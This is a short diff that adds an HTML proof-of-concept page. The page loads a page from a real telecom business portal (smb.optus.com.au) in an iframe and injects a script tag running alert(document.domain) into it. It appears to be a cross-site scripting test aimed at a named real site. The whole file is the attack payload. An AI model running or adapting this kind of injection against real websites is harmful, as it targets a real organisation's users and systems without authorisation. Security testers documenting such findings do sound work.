@@ -1,0 +1,14 @@
+<html>
+<body>
+    <iframe id="targetFrame" src="https://smb.optus.com.au/opfiles/OnePortal/html/void.html"></iframe>
+    <script>
+        // Wait for the iframe to load
+        var iframe = document.getElementById('targetFrame');
+        iframe.onload = function() {
+            // Access the iframe's content and inject the script
+            var iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
+            iframeDocument.body.innerHTML += '<script>alert(document.domain);<\/script>';
+        };
+    </script>
+</body>
+</html>
